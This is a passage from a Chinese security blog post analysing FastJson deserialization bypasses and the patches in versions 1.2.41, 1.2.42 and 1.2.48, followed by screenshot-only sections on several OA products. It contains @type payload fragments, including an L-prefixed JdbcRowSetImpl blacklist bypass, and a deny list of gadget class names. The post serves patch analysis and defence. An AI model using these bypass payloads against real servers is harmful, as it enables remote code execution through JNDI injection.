+<p>{\b”@type”:”org.vulhub.User”,”id”:”1”,/*Comment1*/“name”:/*Comment2*/“test”}</p>
+</blockquote>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfi7zc4r2j31oz0u0e06.jpg" alt="image-20210713183552189"></p>
+<p><code>Unicode</code>字符解析</p>
+<p>在<strong>JSONLexerBase#scanSymbol</strong>方法中如果当前字符为<code>\</code>则会通过switch进行匹配, 以u开头的匹配为<code>unicode</code>字符。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfij61zf2j31dz0u0h3s.jpg" alt="image-20210713184636097"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfihp3v3ij325k0awn3a.jpg" alt="image-20210713184512096"></p>
+<p>正常解析：</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfik6e6ujj31m50u0dz4.jpg" alt="image-20210713184731747"></p>
+<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><h4 id="1-2-41"><a href="#1-2-41" class="headerlink" title="1.2.41"></a>1.2.41</h4><p>FastJson在1.2.41版本中加入了补丁, 位于<strong>com.alibaba.fastjson.parser.ParserConfig</strong>类中新增了<code>checkAutoType</code>方法, 其中会对<code>@type</code>的值进行黑名单检查, 如下是黑名单列表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0 &#x3D; &quot;bsh&quot;</span><br><span class="line">1 &#x3D; &quot;com.mchange&quot;</span><br><span class="line">2 &#x3D; &quot;com.sun.&quot;</span><br><span class="line">3 &#x3D; &quot;java.lang.Thread&quot;</span><br><span class="line">4 &#x3D; &quot;java.net.Socket&quot;</span><br><span class="line">5 &#x3D; &quot;java.rmi&quot;</span><br><span class="line">6 &#x3D; &quot;javax.xml&quot;</span><br><span class="line">7 &#x3D; &quot;org.apache.bcel&quot;</span><br><span class="line">8 &#x3D; &quot;org.apache.commons.beanutils&quot;</span><br><span class="line">9 &#x3D; &quot;org.apache.commons.collections.Transformer&quot;</span><br><span class="line">10 &#x3D; &quot;org.apache.commons.collections.functors&quot;</span><br><span class="line">11 &#x3D; &quot;org.apache.commons.collections4.comparators&quot;</span><br><span class="line">12 &#x3D; &quot;org.apache.commons.fileupload&quot;</span><br><span class="line">13 &#x3D; &quot;org.apache.myfaces.context.servlet&quot;</span><br><span class="line">14 &#x3D; &quot;org.apache.tomcat&quot;</span><br><span class="line">15 &#x3D; &quot;org.apache.wicket.util&quot;</span><br><span class="line">16 &#x3D; &quot;org.apache.xalan&quot;</span><br><span class="line">17 &#x3D; &quot;org.codehaus.groovy.runtime&quot;</span><br><span class="line">18 &#x3D; &quot;org.hibernate&quot;</span><br><span class="line">19 &#x3D; &quot;org.jboss&quot;</span><br><span class="line">20 &#x3D; &quot;org.mozilla.javascript&quot;</span><br><span class="line">21 &#x3D; &quot;org.python.core&quot;</span><br><span class="line">22 &#x3D; &quot;org.springframework&quot;</span><br></pre></td></tr></table></figure>
+
+<p>而使用<code>{&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;}</code>能够绕过<code>checkAutoType</code>的检查, 原因在于调用<code>TypeUtils#loadClass</code>方法时其会检查以<code>L</code>开头并以<code>;</code>结尾的并去除, 但是并不能够触发<code>JNDI</code>注入, 因为在<code>checkAutoType</code>方法的最后判断没有开启autoType会直接抛出异常。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsgwox9680j326u0d2aoa.jpg" alt="image-20210714234206564"></p>
+<h4 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h4><p>较上一个补丁的区别在于<code>checkAutoType</code>中黑名单改为计算哈希匹配, 且在该方法中会判断<code>L</code>开头与<code>;</code>号结尾的话则进行截断, 而同样在<code>TypeUtils#loadClass</code>也会进行<code>L</code>和<code>;</code>的截断, 导致黑名单的绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0 &#x3D; -8720046426850100497</span><br><span class="line">1 &#x3D; -8109300701639721088</span><br><span class="line">2 &#x3D; -7966123100503199569</span><br><span class="line">3 &#x3D; -7766605818834748097</span><br><span class="line">4 &#x3D; -6835437086156813536</span><br><span class="line">5 &#x3D; -4837536971810737970</span><br><span class="line">6 &#x3D; -4082057040235125754</span><br><span class="line">7 &#x3D; -2364987994247679115</span><br><span class="line">8 &#x3D; -1872417015366588117</span><br><span class="line">9 &#x3D; -254670111376247151</span><br><span class="line">10 &#x3D; -190281065685395680</span><br><span class="line">11 &#x3D; 33238344207745342</span><br><span class="line">12 &#x3D; 313864100207897507</span><br><span class="line">13 &#x3D; 1203232727967308606</span><br><span class="line">14 &#x3D; 1502845958873959152</span><br><span class="line">15 &#x3D; 3547627781654598988</span><br><span class="line">16 &#x3D; 3730752432285826863</span><br><span class="line">17 &#x3D; 3794316665763266033</span><br><span class="line">18 &#x3D; 4147696707147271408</span><br><span class="line">19 &#x3D; 5347909877633654828</span><br><span class="line">20 &#x3D; 5450448828334921485</span><br><span class="line">21 &#x3D; 5751393439502795295</span><br><span class="line">22 &#x3D; 5944107969236155580</span><br><span class="line">23 &#x3D; 6742705432718011780</span><br><span class="line">24 &#x3D; 7179336928365889465</span><br><span class="line">25 &#x3D; 7442624256860549330</span><br><span class="line">26 &#x3D; 8838294710098435315</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshf9vj9b0j31n40u0b29.jpg" alt="image-20210715102500282"></p>
+<h4 id="1-2-48"><a href="#1-2-48" class="headerlink" title="1.2.48"></a>1.2.48</h4><p><strong>MiscCodec#deserialze</strong>调用<code>TypeUtils#loadClass</code>时默认<code>cache</code>参数为false, 不会写入<code>mappings</code>中, 无法绕过。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gshpm3fy01j31qw03omy0.jpg" alt="image-20210715162240506"></p>
+<h2 id="蓝凌OA"><a href="#蓝凌OA" class="headerlink" title="蓝凌OA"></a>蓝凌OA</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfpiigqphj31rg0u0e81.jpg" alt="image-20210713224811093"></p>
+<h2 id="用友NC"><a href="#用友NC" class="headerlink" title="用友NC"></a>用友NC</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsfpkmlng4j31lk0u0wte.jpg" alt="image-20210713225013220"></p>
+<h2 id="致远OA"><a href="#致远OA" class="headerlink" title="致远OA"></a>致远OA</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsi29sby64j31d10u0jtt.jpg" alt="image-20210715234040084"></p>
+<h2 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h2><p><img src="http://searchnull-image.oss-cn-shenzhen.aliyuncs.com/2021-07-21-094124.png" alt="image-20210716173215945"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI注入"><span class="toc-number">1.</span> <span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#高版本JDK"><span class="toc-number">1.1.</span> <span class="toc-text">高版本JDK</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat回显"><span class="toc-number">2.</span> <span class="toc-text">Tomcat回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson"><span class="toc-number">3.</span> <span class="toc-text">FastJson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-lt-1-2-48"><span class="toc-number">3.1.</span> <span class="toc-text">FastJson &lt; 1.2.48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三者结合"><span class="toc-number">3.2.</span> <span class="toc-text">三者结合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.3.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BasicDataSource"><span class="toc-number">3.4.</span> <span class="toc-text">BasicDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#版本探测"><span class="toc-number">3.5.</span> <span class="toc-text">版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">3.6.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补丁分析"><span class="toc-number">3.7.</span> <span class="toc-text">补丁分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-41"><span class="toc-number">3.7.1.</span> <span class="toc-text">1.2.41</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-42"><span class="toc-number">3.7.2.</span> <span class="toc-text">1.2.42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-48"><span class="toc-number">3.7.3.</span> <span class="toc-text">1.2.48</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#蓝凌OA"><span class="toc-number">4.</span> <span class="toc-text">蓝凌OA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用友NC"><span class="toc-number">5.</span> <span class="toc-text">用友NC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#致远OA"><span class="toc-number">6.</span> <span class="toc-text">致远OA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#海康威视"><span class="toc-number">7.</span> <span class="toc-text">海康威视</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&text=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&is_video=false&description=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=FastJson与Tomcat回显&body=Check out this article: http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&title=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&name=FastJson与Tomcat回显&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/07/23/FastJson%E4%B8%8ETomcat%E5%9B%9E%E6%98%BE/&t=FastJson与Tomcat回显" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Search?=Null
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
